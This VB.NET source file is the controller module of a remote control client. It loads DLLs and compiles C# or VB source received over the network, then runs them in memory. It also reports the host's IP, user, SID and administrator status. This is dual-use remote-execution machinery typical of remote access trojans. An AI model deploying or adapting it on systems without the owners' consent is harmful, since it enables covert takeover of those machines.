Imports captainalm.calmclientandserver
Imports System.Security.Principal
Imports System.Reflection
Imports System.Threading
Imports Microsoft.CSharp
Imports Microsoft.VisualBasic
Imports System.CodeDom.Compiler

Friend Module controller
    Friend queue_reset As Boolean = False

    Sub exec()

        While receive_packet_queue.Count > 0
            Dim p As packet = receive_packet_queue.Dequeue()
            If p.header.StartsWith("0;") Then
                Dim packet_frame(Int(p.stringdata(pass))) As packet
                packet_frame(0) = p
                If received_packet_store.ContainsKey(p.referencenumber) Then
                    received_packet_store(p.referencenumber) = packet_frame
                Else
                    received_packet_store.Add(p.referencenumber, packet_frame)
                End If
            Else
                If received_packet_store.ContainsKey(p.referencenumber) Then
                    Dim index_str As String = p.header.Substring(0, p.header.IndexOf(";"))
                    Dim index As Integer = Int(index_str)
                    Dim packet_frame As packet() = received_packet_store(p.referencenumber)
                    packet_frame(index) = p
                    received_packet_store(p.referencenumber) = packet_frame
                    If index = Int(packet_frame(0).stringdata(pass)) Then
                        addpacket(join_packets(received_packet_store(p.referencenumber)))
                        received_packet_store.Remove(p.referencenumber)
                    End If
                End If
            End If
        End While

        While getcount() > 0
            Dim cpacket As packet = getpacket(0)
            If cpacket.header.StartsWith("dll:") Then
                Dim nom As String = cpacket.header.Substring(cpacket.header.IndexOf(":") + 1)
                If add_dll(nom, cpacket.objectdata(pass)) Then
                    send_packet(New packet(cpacket.referencenumber, client_name, New List(Of String), "return", "DLL Added [OK]", New EncryptionParameter(EncryptionMethod.unicodease, pass)))
                Else
                    send_packet(New packet(cpacket.referencenumber, client_name, New List(Of String), "return", "DLL Not Added [FAIL]", New EncryptionParameter(EncryptionMethod.unicodease, pass)))
                End If
            ElseIf cpacket.header.StartsWith("int:") Then
                Dim cmd As String = cpacket.header.Substring(cpacket.header.IndexOf(":") + 1)
                send_packet(New packet(cpacket.referencenumber, client_name, New List(Of String), "return", internal_cmd(cmd, cpacket.stringdata(pass)), New EncryptionParameter(EncryptionMethod.unicodease, pass)))
            ElseIf cpacket.header.StartsWith("cmd:") Then
                send_packet(New packet(cpacket.referencenumber, client_name, New List(Of String), "return", dll_cmd(cpacket.header.Substring(cpacket.header.IndexOf(":") + 1), cpacket.objectdata(pass)), New EncryptionParameter(EncryptionMethod.unicodease, pass)))
            ElseIf cpacket.header = "req" Then
                client_name = cpacket.stringdata(pass)
                send_intal_data(cpacket.referencenumber)
            ElseIf cpacket.header.StartsWith("compcs:") Then
                Dim nom As String = cpacket.header.Substring(cpacket.header.IndexOf(":") + 1)
                Dim cc As compiled_assembly = compile_cs(cpacket.stringdata(pass))
                If cc.success Then
                    If add_dll(nom, cc.assembly) Then
                        send_packet(New packet(cpacket.referencenumber, client_name, New List(Of String), "return", "C# Added [OK]", New EncryptionParameter(EncryptionMethod.unicodease, pass)))
                    Else
                        send_packet(New packet(cpacket.referencenumber, client_name, New List(Of String), "return", "C# Not Added [FAIL]", New EncryptionParameter(EncryptionMethod.unicodease, pass)))
                    End If
                Else
                    send_packet(New packet(cpacket.referencenumber, client_name, New List(Of String), "return", cc.stats, New EncryptionParameter(EncryptionMethod.unicodease, pass)))
                End If
            ElseIf cpacket.header.StartsWith("compvb:") Then
                Dim nom As String = cpacket.header.Substring(cpacket.header.IndexOf(":") + 1)
                Dim cc As compiled_assembly = compile_vb(cpacket.stringdata(pass))
                If cc.success Then
                    If add_dll(nom, cc.assembly) Then
                        send_packet(New packet(cpacket.referencenumber, client_name, New List(Of String), "return", "VB Added [OK]", New EncryptionParameter(EncryptionMethod.unicodease, pass)))
                    Else
                        send_packet(New packet(cpacket.referencenumber, client_name, New List(Of String), "return", "VB Not Added [FAIL]", New EncryptionParameter(EncryptionMethod.unicodease, pass)))
                    End If
                Else
                    send_packet(New packet(cpacket.referencenumber, client_name, New List(Of String), "return", cc.stats, New EncryptionParameter(EncryptionMethod.unicodease, pass)))
                End If
            End If
            removepacket(0)
        End While

        If queue_reset Then
            disconnect()
            queue_reset = False
        End If
    End Sub

    Function dll_cmd(cmd As String, args As Object) As String
        Try
            Dim dll_nom As String = cmd.Substring(0, cmd.IndexOf("."))
            Dim dll_instance_nom As String = cmd.Substring(cmd.IndexOf(".") + 1, (cmd.LastIndexOf(".") - 1) - cmd.IndexOf("."))
            Dim func_name As String = cmd.Substring(cmd.LastIndexOf(".") + 1)
            If dlls_loaded.ContainsKey(dll_nom) Then
                Dim dll_instance As Object = dlls_loaded(dll_nom).CreateInstance(dll_instance_nom)
                Dim dll_instance_type As Type = dll_instance.GetType()
                Dim func_info As MethodInfo = dll_instance_type.GetMethod(func_name, BindingFlags.Public Or BindingFlags.Instance)
                Try
                    Return func_info.Invoke(dll_instance, New Object() {args}).ToString & " [OK]"
                Catch ex As ThreadAbortException
                    Thread.CurrentThread.Abort()
                Catch ex As Exception
                    func_info.Invoke(dll_instance, New Object() {args})
                End Try
                Return "[OK]"
            Else
                Return "Requested DLL Not Loaded [FAIL]"
            End If
        Catch ex As ThreadAbortException
            Thread.CurrentThread.Abort()
        Catch ex As Exception
            Return "Exception: " & ex.GetType().ToString & " : " & ex.Message & " [FAIL]"
        End Try
        Return "[FAIL]"
    End Function

    Function internal_cmd(cmd As String, args As String) As String
        If cmd = "stop" Or cmd = "exit" Or cmd = "end" Then
            queue_reset = True
            to_restart = False
            to_exit = True
        ElseIf cmd = "restart" Then
            queue_reset = True
            restart_args = args
            to_restart = True
            to_exit = True
        ElseIf cmd = "reset" Then
            queue_reset = True
        ElseIf cmd = "dlls" Then
            Dim toret As String = "[DLLS]" & ControlChars.CrLf
            For Each Val As String In dlls_loaded.Keys
                toret = toret & Val & ControlChars.CrLf
            Next
            toret = toret & "Internal Message Received [DONE]"
            Return toret
        ElseIf cmd = "dll" Then
            Dim toret As String = "[DLL]" & ControlChars.CrLf
            If dlls_loaded.ContainsKey(args) Then
                toret = toret & "Dynamic Link Library" & args & " does exist."
            Else
                toret = toret & "Dynamic Link Library" & args & " does not exist."
            End If
            toret = toret & ControlChars.CrLf & "Internal Message Received [DONE]"
            Return toret
        ElseIf cmd = "cdlls" Then
            dlls_loaded.Clear()
        ElseIf cmd = "rdll" Then
            If dlls_loaded.ContainsKey(args) Then
                dlls_loaded.Remove(args)
            End If
        ElseIf cmd = "servstp" Then
            stop_the_service = True
            queue_reset = True
            to_restart = False
            to_exit = True
        End If
        Return "Internal Message Received [DONE]"
    End Function

    Sub send_intal_data(Optional ref As Integer = 0)
        send_packet(New packet(ref, client_name, New List(Of String), "client_data", "ip:" & ip_address & ";user:" & user_data().Name & ";sid:" & user_data().User.Value & ";admin:" & New WindowsPrincipal(user_data()).IsInRole(WindowsBuiltInRole.Administrator).ToString, New EncryptionParameter(EncryptionMethod.unicodease, pass)))
    End Sub

    Function compile_cs(ByVal data As String) As compiled_assembly
        Try
            Dim cc As CodeDomProvider = New CSharpCodeProvider()
            Dim cp As New CompilerParameters()
            cp.GenerateInMemory = True
            For Each c As String In get_imports_from_comment(data)
                cp.ReferencedAssemblies.Add(c)
            Next
            Dim cr As CompilerResults = cc.CompileAssemblyFromSource(cp, data)
            If cr.Errors.HasErrors OrElse cr.Errors.HasWarnings Then
                Return New compiled_assembly("Compilation Failed! [FAIL]")
            Else
                Return New compiled_assembly(cr.CompiledAssembly)
            End If
        Catch ex As Exception
            Return New compiled_assembly("Exception: " & ex.GetType().ToString & " : " & ex.Message & " [FAIL]")
        End Try
    End Function

    Function compile_vb(ByVal data As String) As compiled_assembly
        Try
            Dim cc As CodeDomProvider = New VBCodeProvider()
            Dim cp As New CompilerParameters()
            cp.GenerateInMemory = True
            For Each c As String In get_imports_from_comment(data)
                cp.ReferencedAssemblies.Add(c)
            Next
            Dim cr As CompilerResults = cc.CompileAssemblyFromSource(cp, data)
            If cr.Errors.HasErrors OrElse cr.Errors.HasWarnings Then
                Return New compiled_assembly("Compilation Failed! [FAIL]")
            Else
                Return New compiled_assembly(cr.CompiledAssembly)
            End If
        Catch ex As Exception
            Return New compiled_assembly("Exception: " & ex.GetType().ToString & " : " & ex.Message & " [FAIL]")
        End Try
    End Function
End Module
